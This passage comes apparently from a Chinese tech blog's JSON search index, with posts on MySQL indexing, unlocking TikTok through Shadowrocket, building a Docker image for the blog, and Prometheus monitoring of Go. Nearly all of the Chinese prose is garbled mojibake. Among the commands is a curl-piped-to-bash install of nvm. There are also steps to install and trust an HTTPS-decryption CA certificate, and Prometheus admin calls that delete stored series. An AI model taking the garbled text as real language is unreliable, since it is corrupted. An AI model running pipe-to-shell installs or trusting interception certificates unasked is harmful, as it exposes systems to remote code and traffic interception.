ä¸ºç¦»æ•£åº¦é«˜ç´¢å¼•çš„å¯é€‰æ‹©æ€§é«˜\n\n```sql\nSELECT count(DISTINCT user_id), count(DISTINCT lottery_id), count(DISTINCT award_id) FROM lottery_user_log\n```\n\nçœ‹ä¸‹é¢çš„ç»“æœ, è¶Šå¤§çš„é€‚åˆåœ¨å‰é¢\n\n```\ncount(DISTINCT user_id),count(DISTINCT lottery_id),count(DISTINCT award_id) \n56135\t\t\t\t\t\t\t\t\t\t 1\t\t\t\t\t\t\t\t\t\t\t\t\t12\n\né€‚åˆåˆ›å»º (user_id, award_id, lottery_id)  \n```\n\n### 6.5 ä½¿ç”¨çŸ­ç´¢å¼•\n\nå¦‚æœå¯¹å­—ç¬¦ä¸²åˆ—è¿›è¡Œç´¢å¼•ï¼Œåº”è¯¥æŒ‡å®šä¸€ä¸ªå‰ç¼€é•¿åº¦ï¼Œå¯èŠ‚çœå¤§é‡ç´¢å¼•ç©ºé—´ï¼Œæå‡æŸ¥è¯¢é€Ÿåº¦ï¼›\n\nä¾‹å¦‚ï¼Œæœ‰ä¸€ä¸ªCHAR(200)åˆ—ï¼Œå¦‚æœåœ¨å‰10ä¸ªæˆ–20ä¸ªå­—ç¬¦å†…ï¼Œå¤šæ•°å€¼æ˜¯å”¯ä¸€çš„ï¼Œé‚£ä¹ˆå°±ä¸è¦å¯¹æ•´ä¸ªåˆ—è¿›è¡Œç´¢å¼•ã€‚å¯¹å‰10ä¸ªæˆ–è€…20ä¸ªå­—ç¬¦è¿›è¡Œç´¢å¼•èƒ½å¤ŸèŠ‚çœå¤§é‡ç´¢å¼•ç©ºé—´ï¼Œä¹Ÿå¯èƒ½ä¼šä½¿æŸ¥è¯¢æ›´å¿«ã€‚\n\n### 6.6 å°½é‡çš„æ‰©å±•ç´¢å¼•ï¼Œä¸è¦æ–°å»ºç´¢å¼•\n\næ¯”å¦‚è¡¨ä¸­å·²ç»æœ‰açš„ç´¢å¼•ï¼Œç°åœ¨è¦åŠ (a,b)çš„ç´¢å¼•ï¼Œé‚£ä¹ˆåªéœ€è¦ä¿®æ”¹åŸæ¥çš„ç´¢å¼•å³å¯ã€‚\n\n### 6.7 = å’Œ in å¯ä»¥ä¹±åº\n\næ¯”å¦‚a = 1 and b = 2 and c = 3 å»ºç«‹(a,b,c)ç´¢å¼•å¯ä»¥ä»»æ„é¡ºåºï¼Œmysqlçš„æŸ¥è¯¢ä¼˜åŒ–å™¨ä¼šå¸®ä½ ä¼˜åŒ–æˆç´¢å¼•å¯ä»¥è¯†åˆ«çš„å½¢å¼ã€‚\n\n### 6.8 ç´¢å¼•åˆ—ä¸èƒ½å‚ä¸å‡½æ•°è®¡ç®—\n\næ¯”å¦‚from_unixtime(create_time) = â€™2014-05-29â€™å°±ä¸èƒ½ä½¿ç”¨åˆ°ç´¢å¼•ï¼ŒåŸå› å¾ˆç®€å•ï¼Œb+æ ‘ä¸­å­˜çš„éƒ½æ˜¯æ•°æ®è¡¨ä¸­çš„å­—æ®µå€¼ï¼Œä½†è¿›è¡Œæ£€ç´¢æ—¶ï¼Œéœ€è¦æŠŠæ‰€æœ‰å…ƒç´ éƒ½åº”ç”¨å‡½æ•°æ‰èƒ½æ¯”è¾ƒï¼Œæ˜¾ç„¶æˆæœ¬å¤ªå¤§ã€‚æ‰€ä»¥è¯­å¥åº”è¯¥å†™æˆcreate_time = unix_timestamp(â€™2014-05-29â€™)ã€‚\n\n### 6.9 å¼ºåˆ¶ç±»å‹è½¬æ¢ä¼šç”¨ä¸åˆ°ç´¢å¼•\n\nphone varchar(20),   index(phone)ã€‚æ³¨æ„phoneæ˜¯å­—ç¬¦ä¸²ç±»å‹ã€‚\n\n```sql\nselect phone where phone = '1000000' # ç”¨åˆ°ç´¢å¼•\nselect phone where phone = 1000000   # ç”¨ä¸åˆ°ç´¢å¼•\n```\n\n### 6.10 ç´¢å¼•çš„åˆ—ä¸è¦ä¸º null\n\nä¹Ÿèƒ½å»ºç«‹ç´¢å¼•, ä½†æ˜¯ä¼šé€ æˆä¸ç¬¦åˆé¢„æœŸçš„è¡Œä¸ºã€‚\n\n### 6.11 ç´¢å¼•æ•°é‡æ§åˆ¶\n\n+ å•è¡¨ç´¢å¼•æ§åˆ¶åœ¨5ä¸ªä»¥å†…\n\n+ å¤åˆç´¢å¼•å­—æ®µæœ€å¥½ä¸è¶…è¿‡5ä¸ª\n\n### 6.12 åœ¨åˆé€‚çš„åˆ—ä¸Šåˆ›å»ºç´¢å¼•\n\n+ é¢‘ç¹ä½œä¸º WHERE æŸ¥è¯¢æ¡ä»¶çš„å­—æ®µ\n\n+ ç»å¸¸ GROUP BY å’Œ ORDER BY çš„åˆ—\n\n+ DISTINCT åé¢çš„å­—æ®µ\n\n\n### 6.13 ä»€ä¹ˆæ—¶å€™è¦åˆ›å»ºç´¢å¼•\n\n- è¡¨ç»å¸¸è¿›è¡Œ SELECT æ“ä½œã€‚\n- è¡¨å¾ˆå¤§(è®°å½•è¶…å¤š)ï¼Œè®°å½•å†…å®¹åˆ†å¸ƒèŒƒå›´å¾ˆå¹¿ã€‚\n- åˆ—åç»å¸¸åœ¨ WHERE å­å¥æˆ–è¿æ¥æ¡ä»¶ä¸­å‡ºç°ã€‚\n\n### 6.14 ä»€ä¹ˆæ—¶å€™ä¸è¦åˆ›å»ºç´¢å¼•\n\n- è¡¨ç»å¸¸è¿›è¡Œ INSERT/UPDATE/DELETE æ“ä½œ\n- è¡¨å¾ˆå°(è®°å½•è¶…å°‘)\n- åˆ—åä¸ç»å¸¸ä½œä¸ºè¿æ¥æ¡ä»¶æˆ–å‡ºç°åœ¨ WHERE å­å¥ä¸­\n- å­—æ®µå†…å®¹é‡å¤å¾ˆå¤š\n\n# 7. å¤´è„‘é£æš´\n\n+ B+æ ‘èµ°ç´¢å¼•æ˜¯ä»ä¸Šå¾€ä¸‹ï¼Œå…¨è¡¨æ‰«ææ˜¯ä»å·¦å¾€å³ã€‚\n+ InnoDBåªèƒ½æœ‰ä¸€ä¸ªèšé›†ç´¢å¼•ï¼Œç´¢å¼•å’Œæ•°æ®åœ¨ä¸€èµ·ã€‚\n+ InnoDBå…¶ä»–çš„ç´¢å¼•å°±åšè¾…åŠ©ç´¢å¼•ï¼Œèµ°ç´¢å¼•åï¼Œæ‰¾åˆ°çš„æ•°æ®æ—¶åœ¨ç”¨èšé›†ç´¢å¼•ï¼Œå†æ¬¡å›è¡¨æŸ¥è¯¢ã€‚\n+ å¤šèŒƒå›´è¯»MRRï¼Œæ˜¯è¾…åŠ©ç´¢å¼•æ’åºåï¼Œç›´æ¥ä¸€èµ·å›è¡¨ï¼Œå‡å°‘ç£ç›˜çš„éšæœºè®¿é—®ã€‚\n+ ç´¢å¼•ä¸‹æ¨ï¼Œæ˜¯ä¸€ä¸ªå¤åˆç´¢å¼•ï¼ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥åœ¨å­˜å‚¨å™¨è¿‡æ»¤ã€‚\n+ å»ºç«‹ç´¢å¼•ï¼šæœ€å·¦åŒ¹é…ï¼ŒåŒºåˆ†åº¦é«˜ï¼Œä¸è¦ä¸º nullï¼Œæ‰©å±•ç´¢å¼•ï¼Œæ•°é‡æ§åˆ¶ã€‚\n+ æŸ¥è¯¢ç´¢å¼•ï¼šå¤åˆç´¢å¼•ï¼Œä¸å‚ä¸å‡½æ•°ï¼Œä¸å¼ºè½¬ç±»å‹ã€‚\n\n# 8. å‚è€ƒèµ„æ–™\n\n+ https://tech.meituan.com/2014/06/30/mysql-index.html\n+ https://www.infoq.cn/article/OJKWYykjoyc2YGB0Sj2c\n+ https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html\n+ ç´¢å¼• https://www.liuvv.com/p/84544518.html\n- é”å’Œäº‹åŠ¡ https://www.liuvv.com/p/9762ea3e.html\n- MVCC https://www.liuvv.com/p/a0f7945d.html","tags":["mysql"],"categories":["mysql"]},{"title":"å›½å†…æ— éœ€æ‹”å¡è§‚çœ‹tiktok","url":"%2Fp%2F866e5a33.html","content":"\nå›½å†…æŠŠtiktoké™åˆ¶çš„æ­»æ­»çš„ï¼Œå¦‚æœæƒ³çœ‹å¤–é¢çš„ä¸–ç•Œï¼Œéœ€è¦å€ŸåŠ©è¿™ä¸ªé¡¹ç›®ï¼šhttps://github.com/Semporia/TikTok-Unlockã€‚\n\néœ€è¦è‡ªå¤‡çš„ä¸œè¥¿ï¼š1.  Shadowrocket 2. æ¢¯å­èŠ‚ç‚¹ 3. ç¾åŒºappstoreè´¦å·ã€‚\n\n\n\n# 1. æ“ä½œæµç¨‹\n\n### 1.1 å…ˆé™çº§tiktokç‰ˆæœ¬\n\næ¨è  TikTok 21.1.0ï¼Œå¦‚æœä¸é™çº§ï¼Œé«˜ç‰ˆæœ¬å¾ˆå¯èƒ½ä¸æˆåŠŸã€‚\n<!-- more -->\né™çº§æ•™ç¨‹ï¼š\n\nhttps://github.com/Semporia/TikTok-Unlock#-%E6%8A%93%E5%8C%85%E9%99%8D%E7%BA%A7-tiktok-2110-\n\næœ€åæŠŠä½ç‰ˆæœ¬tiktokå®‰è£…åˆ°æ‰‹æœºä¸Šå³å¯ã€‚\n\n\n\n### 1.2 å®‰è£…å°é£æœºæ·»åŠ é…ç½®\n\n**æ“ä½œæ­¥éª¤**\n\n1ã€æ‰“å¼€`Shadowrocket`\n\n2ã€ç‚¹å‡»`é…ç½®`è¿›å»æ·»åŠ æƒ³çœ‹å›½å®¶çš„å¯¹åº”æ¨¡å—ã€‚\n\n**æ—¥æœ¬**\n\n```\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Shadowrocket/TiKok-JP.conf\n```\n\n**å°æ¹¾**\n\n```\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Shadowrocket/TiKok-TW.conf\n```\n\n**éŸ©å›½**\n\n```\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Shadowrocket/TiKok-KR.conf\n```\n\n**ç¾å›½**\n\n```\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Shadowrocket/TiKok-US.conf\n```\n\n\n\n### 1.3  å®‰è£…è¯ä¹¦å¹¶ä¿¡ä»»\n\n1ã€ Shadowrocket é…ç½® â€“ ç‚¹å‡»ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚ä¸Šé¢å››ç§ï¼‰ â€“ ç¼–è¾‘é…ç½® â€“ å¼€å¯ HTTPS è§£å¯† â€“ ç”Ÿæˆæ–°çš„ CAè¯ä¹¦ â€“ å®‰è£…è¯ä¹¦ï¼›\n\n2ã€ç‚¹å³ä¸Šè§’ â€“ å®‰è£… â€“ è¾“å…¥æ‰‹æœºé”å±å¯†ç  â€“ å†æ¬¡ç‚¹å³ä¸Šè§’ â€“ å®‰è£… â€“ å®‰è£… â€“ å³ä¸Šè§’ â€“ å®Œæˆï¼›\n\n3ã€æ‰“å¼€æ‰‹æœº â€“ è®¾ç½® â€“ é€šç”¨ â€“ å…³äºæœ¬æœº â€“ è¯ä¹¦ä¿¡ä»»è®¾ç½® â€“ æ‰¾åˆ° â€“ Shadowrocketå¼€å¤´çš„é€‰é¡¹ â€“ æ‰“å¼€å³ä¾§å¼€å…³ â€“ å¼¹å‡ºè­¦å‘Šæ¡† â€“ ç»§ç»­ï¼›\n\n\n\n### 1.4 æ·»åŠ åˆ†æµè§„åˆ™\n\næ‰“å¼€Shadowrocket â€“ é…ç½® â€“ æ‰¾åˆ°æœ¬åœ°æ–‡ä»¶å†…çš„é…ç½®æ–‡ä»¶ï¼Œ â€“ ä¾‹å¦‚ç‚¹å‡» default.conf ç‚¹å‡»ç¼–è¾‘çº¯æ–‡æœ¬ï¼›æŠŠä¸‹é¢è§„åˆ™æ·»åŠ ä¸Šå³å¯ã€‚\n\n```\n[Rule]\nDOMAIN,p16-tiktokcdn-com.akamaized.net,PROXY\nDOMAIN-SUFFIX,amemv.com,PROXY\nDOMAIN-SUFFIX,byteoversea.com,PROXY\nDOMAIN-SUFFIX,ibytedtos.com,PROXY\nDOMAIN-SUFFIX,ibyteimg.com,PROXY\nDOMAIN-SUFFIX,ipstatp.com,PROXY\nDOMAIN-SUFFIX,muscdn.com,PROXY\nDOMAIN-SUFFIX,musical.ly,PROXY\nDOMAIN-SUFFIX,sgpstatp.com,PROXY\nDOMAIN-SUFFIX,snssdk.com,PROXY\nDOMAIN-SUFFIX,tik-tokapi.com,PROXY\nDOMAIN-SUFFIX,tiktok.com,PROXY\nDOMAIN-SUFFIX,tiktokcdn.com,PROXY\nDOMAIN-SUFFIX,tiktokv.com,PROXY\nDOMAIN-KEYWORD,-tiktokcdn-com,PROXY\nUSER-AGENT,TikTok*,PROXY\nFINAL,DIRECT\n```\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n+ https://github.com/Semporia/TikTok-Unlock\n","tags":["tiktok"],"categories":["ä½¿ç”¨è½¯ä»¶"]},{"title":"blogåˆ¶ä½œdockeré•œåƒè®°å½•","url":"%2Fp%2F252a8c24.html","content":"\nå› ä¸º blog æ¶‰åŠçš„æœ¬åœ°ä¾èµ–è¿‡å¤šï¼Œ ç‰¹æ„æ”¾åˆ° docker ä¸Šï¼Œ æ–¹ä¾¿å‘å¸ƒåšå®¢å’Œç§»æ¤ã€‚åˆ¶ä½œé•œåƒçš„æ—¶å€™ï¼Œå°½é‡é€‰æ‹©å›½å¤–æœåŠ¡å™¨ï¼Œå›½å†…çš„æœåŠ¡å™¨ä¸‹è½½åŒ…å¾ˆå®¹æ˜“é™·å…¥æ­»å¾ªç¯ã€‚\n\n# 1. å®¿ä¸»æœºå‡†å¤‡\n\n### 1.1 å®‰è£…docker\n\n```bash\napt update\napt install docker.io\n```\n\n<!-- more -->\n\n### 1.2 å®¿ä¸»æœºå¼€å¯é•œåƒåŠ é€Ÿ\n\n<img src=\"blogåˆ¶ä½œdockeré•œåƒè®°å½•/image-20230909171630001.png\" alt=\"image-20230909171630001\" style=\"zoom: 33%;\" />\n\nhttps://cr.console.aliyun.com/   å…ˆç»™æœ¬æœºæ¥ä¸ªåŠ é€Ÿã€‚\n\n\n\n```bash\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://xxxx.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n\n\n\n# 2. åˆ¶ä½œé•œåƒ\n\n### 1.1 åˆ›å»ºå®¹å™¨å®‰è£…ä¾èµ–\n\n```bash\n# 1. åˆ›å»ºå®¹å™¨\ndocker run -itd --name levon_blog_base ubuntu\ndocker exec -it levon_blog_base /bin/bash  \n\n# 2. å®‰è£…å¿…è¦è½¯ä»¶\napt update\napt install -y vim\napt install -y git\napt install -y curl\n\n\n# 3. å®‰è£…blog ä¾èµ–\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash\nnvm install v14\nnvm use 14\nnode -v\n\napt install -y npm\nnpm install hexo-cli -g\n\n\n# 4. é…ç½®gitç¯å¢ƒ\ngit config --global core.quotepath false        \ngit config --global gui.encoding utf-8   \ngit config --global i18n.commit.encoding utf-8  \ngit config --global i18n.logoutputencoding utf-8\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\nexport LESSCHARSET=utf-8\n\n```\n\n\n\n### 1.2 å¢åŠ è‡ªå·±ç¯å¢ƒ\n\n```bash\ngit config --global user.email \"levonfly@gmail.com\"\ngit config --global user.name \"unix2dos\"\n```\n\n+ ssh/config\n\n```bash\nmkdir .ssh\nvi ~/.ssh/config\n\nHost coding e.coding.net\n        HostName e.coding.net\n        IdentityFile ~/.ssh/github-unix2dos\n        User levonfly\nHost github.com\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\nHost unix2dos\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\nHost levonfly\n        HostName github.com\n        IdentityFile ~/.ssh/github-levonfly\n        User levonfly\n```\n\n+ è‡ªå·±çš„ç§é’¥\n\n```bash\n# æ‹·è´ç§é’¥\n\nchmod 600 ~/.ssh/github-unix2dos\nchmod 600 ~/.ssh/github-levonfly\n```\n\n\n\n+ æµ‹è¯•\n\n```bash\ncd ~ && mkdir workspace && cd workspace/\ngit clone git@github.com:unix2dos/readwrite.git\nrm ~/workspace\n```\n\n\n\n### 1.3 æ„é€ å¹¶ä¸Šä¼ é•œåƒ\n\nDocker Hub å…è´¹ç‰ˆåªæœ‰1ä¸ªç§æœ‰åº“ï¼Œ5ä¸ªç§æœ‰åº“è¦7ç¾å…ƒä¸€ä¸ªæœˆï¼ˆå€’ä¹Ÿä¸æ˜¯ç»™ä¸èµ·è¿™ä¸ªé’±ï¼Œåªæ˜¯ç¡®å®ç©·....ï¼‰ã€‚è‡ªå·±æ­ Docker Registryåˆå«Œéº»çƒ¦ï¼Œå°±æ”¾åˆ°å›½å†…çš„é˜¿é‡Œäº†ï¼ˆå…è´¹ï¼‰ã€‚\n\nhttps://cr.console.aliyun.com/  ååŒ—2ï¼ˆåŒ—äº¬ï¼‰\n\n\n\n```bash\n# 1. åœ¨å®¿ä¸»æœºæ„å»ºimage\ndocker commit -a \"levonfly\" -m \"levonflyçš„åšå®¢åŸºç¡€ç¯å¢ƒ\" efb25f31a0a0 levonfly/levon_blog_base\n\n\n# 2. ç™»å½•é˜¿é‡Œäº‘\ndocker login --username=l6241425 registry.cn-beijing.aliyuncs.com\n\n# 3. ä¸Šä¼ é•œåƒåˆ°é˜¿é‡Œäº‘\ndocker tag levonfly/levon_blog_base registry.cn-beijing.aliyuncs.com/levonfly/levon_blog_base:1.0\n\ndocker push registry.cn-beijing.aliyuncs.com/levonfly/levon_blog_base:1.0\n\n\n# 4. ä¸‹è½½é˜¿é‡Œäº‘é•œåƒ\ndocker run -itd --name hexo_base registry.cn-beijing.aliyuncs.com/levonfly/levon_blog_base:1.0\ndocker exec -it levon_blog_base /bin/bash  \n\n```\n\n<img src=\"blogåˆ¶ä½œdockeré•œåƒè®°å½•/image-20230910092904490.png\" alt=\"image-20230910092904490\" style=\"zoom:50%;\" />\n\n# 2. blogç¯å¢ƒ\n\n### 2.1 ä¸‹è½½é•œåƒ\n\n```bash\ndocker login --username=l6241425 registry.cn-beijing.aliyuncs.com\n\ndocker run -itd --name levon_blog registry.cn-beijing.aliyuncs.com/levonfly/levon_blog_base:1.0\ndocker exec -it levon_blog /bin/bash  \n```\n\n### 2.2 ä¸‹è½½é¡¹ç›®1\n\n```bash\ncd ~ && mkdir workspace && cd workspace/\n\n# 1. ä¸‹è½½é¡¹ç›®\ngit clone git@github.com:unix2dos/readwrite.git\ncd readwrite\ngit submodule update --init\n\n# 2. å®‰è£…ä¾èµ–\nnpm i\n\n# 3. æµ‹è¯•éƒ¨ç½²\nhexo server --config source/_data/next.yml\nhexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n./deploy.sh\n\n```\n\n### 2.3 ä¸‹è½½é¡¹ç›®2\n\n```bash\ncd ~ && mkdir workspace && cd workspace/\n\n# 1. ä¸‹è½½é¡¹ç›®\ngit clone git@github.com:unix2dos/unix2dos.github.io.git\ncd unix2dos.github.io\ngit checkout source\ngit submodule update --init\n\n# 2. å®‰è£…ä¾èµ–\nnpm i\n\n\n# 3. æ’ä»¶ï¼ˆä¸éœ€è¦ï¼‰ \n\n# æ‡’åŠ è½½\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n# é¡¶éƒ¨çš„è¿›åº¦\ngit clone https://github.com/theme-next/theme-next-pace source/lib/pace \n# è¯»å–è¿›åº¦\ngit clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress\n# åˆ†äº«æŒ‰é’®\ngit clone https://github.com/theme-next/theme-next-needmoreshare2 source/lib/needsharebutton \n# ä¸å¸¦\ngit clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon\n# èœ˜è››ç½‘\ngit clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest\n# ä¸‰ç§ç‰¹æ•ˆ\ngit clone https://github.com/theme-next/theme-next-three source/lib/three \n# ç‰¹æ®Šæ±‰å­—\ngit clone https://github.com/theme-next/theme-next-han source/lib/Han\n# å¿«é€Ÿç‚¹å‡»\ngit clone https://github.com/theme-next/theme-next-fastclick source/lib/fastclick\n# å›¾ç‰‡å±•ç¤º\ngit clone https://github.com/theme-next/theme-next-fancybox3 source/lib/fancybox \n# æ–‡å­—æ˜¾ç¤ºåŠ ç©ºæ ¼\ngit clone https://github.com/theme-next/theme-next-pangu.git source/lib/pangu\n\n\n# 4. æµ‹è¯•éƒ¨ç½²\nhexo server --config source/_data/next.yml\nhexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n./deploy.sh\n```\n\n\n\n### 2.4 ä½¿ç”¨\n\n```bash\n# ç¬¬ä¸€ä¸ªé¡¹ç›®\ndocker run -itd --name blog_unix2dos registry.cn-beijing.aliyuncs.com/levonfly/blog_unix2dos:1.0\n\ndocker exec -it blog_unix2dos /bin/bash  \n\n\n# ç¬¬äºŒä¸ªé¡¹ç›®\ndocker run -itd --name blog_readwrite registry.cn-beijing.aliyuncs.com/levonfly/blog_readwrite:1.0\n\ndocker exec -it blog_readwrite /bin/bash  \n```\n\n\n\n# 4.å‚è€ƒèµ„æ–™\n\n+ https://1c7.me/2019-1-31-china-free-private-docker-registry/","tags":["blog"],"categories":["åšå®¢"]},{"title":"prometheusç›‘æ§golang","url":"%2Fp%2Fbdb3a622.html","content":"\næŠŠprometheuså’Œgolangç»“åˆåœ¨ä¸€èµ·ï¼Œå¹¶ç›‘æ§golangçš„æ€§èƒ½å’Œæ¥å£çŠ¶æ€ã€‚\n\n# 1. golangçš„ä½¿ç”¨\n\n### 1.1 åŸºç¡€çš„å†…ç½®æŒ‡æ ‡\n\n+ ä¸‹è½½åŒ…\n\n```bash\ngo get github.com/prometheus/client_golang/prometheus\ngo get github.com/prometheus/client_golang/prometheus/promauto\ngo get github.com/prometheus/client_golang/prometheus/promhttp\n```\n<!-- more -->\n\n\n\n+ ä»£ç æ³¨å†Œ\n\n```go\npackage main\n\nimport (\n        \"net/http\"\n\n        \"github.com/prometheus/client_golang/prometheus/promhttp\"\n)\n\nfunc main() {\n        http.Handle(\"/metrics\", promhttp.Handler())\n        http.ListenAndServe(\":2112\", nil)\n}\n```\n\n```\ngo run main.go\n```\n\n+ è®¿é—®è·å–ä¿¡æ¯\n\n```\ncurl http://localhost:2112/metrics\n```\n\n+ é…ç½®prometheus\n\n```bash\nsudo vi /opt/prometheus/prometheus.yml\n```\n\n```yml\n  - job_name: 'golang'\n    scrape_interval: 10s\n    static_configs:\n      - targets: ['127.0.0.1:2112']\n```\n\n```bash\nsudo systemctl restart prometheus\n```\n\n+ å¯¼å…¥æ¨¡æ¿ 6671\n\n<img src=\"prometheusç›‘æ§golang/image-20220216174037473.png\" alt=\"image-20220216174037473\" style=\"zoom:33%;\" />\n\n\n\n### 1.2 gin åŒ…è£… prometheus\n\n+ ä¸‹è½½åŒ…\n\n```bash\ngo get github.com/zsais/go-gin-prometheus\n```\n\n+ ä»£ç \n\n```go\n\t// prometheus wrap\n\tp := ginprometheus.NewPrometheus(\"gin\")\n\tp.ReqCntURLLabelMappingFn = func(c *gin.Context) string {\n\t\turl := c.Request.URL.Path\n\t\tfor _, p := range c.Params {\n\t\t\tif p.Key == \"id\" {\n\t\t\t\turl = strings.Replace(url, p.Value, \":id\", 1)\n\t\t\t\tbreak\n\t\t\t} else if p.Key == \"short_link\" {\n\t\t\t\turl = strings.Replace(url, p.Value, \":short_link\", 1)\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\treturn url\n\t}\n\tp.Use(appEngine)\n```\n\næ³¨æ„è¿™æ®µä»£ç å°½é‡é å‰æ”¾ï¼Œåœ¨å…¶ä»–ä¸­é—´ä»¶ä¹‹å‰ã€‚\n\n+ é»˜è®¤åœ°å€æ˜¯/metrics\n\nâ€‹\thttp://127.0.0.1:9061/metrics\n\n![image-20220217103251959](prometheusç›‘æ§golang/image-20220217103251959.png)\n\n+ æ¨¡æ¿\n\n```bash\n# æ¥å£è¯·æ±‚\ngin_requests_total{job=\"golang\"}       \nLegendï¼š {{url}}  \n\n\n#é”™è¯¯ç \npromhttp_metric_handler_requests_total{job=\"golang\", instance=\"127.0.0.1:9061\"}\nLegendï¼š{{code}} \n```\n\n<img src=\"prometheusç›‘æ§golang/image-20220217142344934.png\" alt=\"image-20220217142344934\" style=\"zoom:50%;\" />\n\n\n\n### 1.3 å¦å¤–ä¸€ä¸ªåº“\n\nhttps://github.com/penglongli/gin-metrics\n\n\n\n# 2. æŠ¥è­¦æœºåˆ¶\n\n### 2.1 Alertç›‘æ§æŠ¥è­¦\n\n+ æ‰“å¼€é…ç½®\n\n```bash\nsudo vi /etc/grafana/grafana.ini \n#In your custom configuration file ($WORKING_DIR/conf/custom.ini), go to the unified alerts section. Set the enabled property to true.\n\nsudo systemctl restart grafana-server.service\n```\n\n+ æ–°å»ºæŠ¥è­¦API\n\n<img src=\"prometheus%E7%9B%91%E6%8E%A7golang/image-20220217143522329.png\" alt=\"image-20220217143522329\" style=\"zoom: 33%;\" />\n\né£ä¹¦ä¸æ”¯æŒï¼Œè‡ªå·±ç”¨æ¥å£ä¸­è½¬ä¸€ä¸‹å§ã€‚\n<img src=\"prometheus%E7%9B%91%E6%8E%A7golang/image-20220217151105605.png\" alt=\"image-20220217151105605\" style=\"zoom: 33%;\" />\n\n+ æŠ¥è­¦åŒ¹é…è§„åˆ™\n<img src=\"prometheus%E7%9B%91%E6%8E%A7golang/image-20220217151737625.png\" alt=\"image-20220217151737625\" style=\"zoom: 50%;\" />\n\n\n\n\n# 3. é‡åˆ°çš„é—®é¢˜\n\n### 3.1 åˆ é™¤old jobså’Œinstance\n\nExpanding on evgenyl's answer, the exact command would be something like:\n\n```bash\ncurl -X POST -g 'http://localhost:9090/api/v1/admin/tsdb/delete_series?match[]={job=\"name_of_old_job\"}'\n```\n\nReplace name_of_old_job with the name of the job you want deleted.\n\nReminder that you need to have started prometheus with the **--web.enable-admin-api** flag\n\nâ€‹\t\n\n```bash\ncurl -X POST -g 'http://localhost:9090/api/v1/admin/tsdb/delete_series?match[]={job=\"linux-node\"}'\ncurl -X POST -g 'http://localhost:9090/api/v1/admin/tsdb/delete_series?match[]={instance=\"localhost:9100\"}'\n```\n\nä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä¸Šé¢çš„ API è°ƒç”¨å¹¶ä¸ä¼šç«‹å³åˆ é™¤æ•°æ®ï¼Œå®é™…æ•°æ®ä»»ç„¶è¿˜å­˜åœ¨ç£ç›˜ä¸Šï¼Œä¼šåœ¨åé¢è¿›è¡Œæ•°æ®æ¸…ç†ã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://studygolang.com/articles/17959\n+ https://www.cnblogs.com/sanduzxcvbnm/p/13602681.html","tags":["prometheus"],"categories":["3_golangæ‚é¡¹"]},{"title":"Prometheusçš„alertmanagerä½¿ç”¨","url":"%2Fp%2F6df22f03.html","content":"\nå‘Šè­¦èƒ½åŠ›åœ¨Prometheusçš„æ¶æ„ä¸­è¢«åˆ’åˆ†æˆä¸¤ä¸ªç‹¬ç«‹çš„éƒ¨åˆ†é€šè¿‡åœ¨Prometheusä¸­å®šä¹‰AlertRuleï¼ˆå‘Šè­¦è§„åˆ™ï¼‰ï¼ŒPrometheusä¼šå‘¨æœŸæ€§çš„å¯¹å‘Šè­¦è§„åˆ™è¿›è¡Œè®¡ç®—ï¼Œå¦‚æœæ»¡è¶³å‘Šè­¦è§¦å‘æ¡ä»¶å°±ä¼šå‘Alertmanagerå‘é€å‘Šè­¦ä¿¡æ¯ã€‚\n\n![image-20220726115047660](prometheusçš„alertmanager/0.png)\n\n<!-- more -->\n\n# 1. æ•°æ®çœ‹æ¿\n\næ•™ç¨‹ï¼š https://prometheus.io/docs/guides/node-exporter/\n\n### 1.1 æŸ¥çœ‹ metrics\n\næŸ¥çœ‹targetçš„metricsæ•°æ®ï¼Œå¦‚æœæ˜¯å±€åŸŸç½‘ï¼Œå¯ä»¥curlè§‚çœ‹ã€‚\n\n```bash\ncurl http://172.31.32.228:9100/metrics\n \n\n# HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.\n# TYPE go_gc_duration_seconds summary\ngo_gc_duration_seconds{quantile=\"0\"} 3.6128e-05\ngo_gc_duration_seconds{quantile=\"0.25\"} 7.7366e-05\ngo_gc_duration_seconds{quantile=\"0.5\"} 0.000134775\ngo_gc_duration_seconds{quantile=\"0.75\"} 0.000252918\ngo_gc_duration_seconds{quantile=\"1\"} 0.014089749\ngo_gc_duration_seconds_sum 1298.146436301\ngo_gc_duration_seconds_count 3.161587e+06\n\n# HELP node_filesystem_avail_bytes Filesystem space available to non-root users in bytes.\n# TYPE node_filesystem_avail_bytes gauge\nnode_filesystem_avail_bytes{device=\"/dev/root\",fstype=\"ext4\",mountpoint=\"/\"} 3.1182485504e+11\nnode_filesystem_avail_bytes{device=\"tmpfs\",fstype=\"tmpfs\",mountpoint=\"/run\"} 1.657331712e+09\nnode_filesystem_avail_bytes{device=\"tmpfs\",fstype=\"tmpfs\",mountpoint=\"/run/lock\"} 5.24288e+06\nnode_filesystem_avail_bytes{device=\"tmpfs\",fstype=\"tmpfs\",mountpoint=\"/run/snapd/ns\"} 1.657331712e+09\n# HELP node_filesystem_device_error 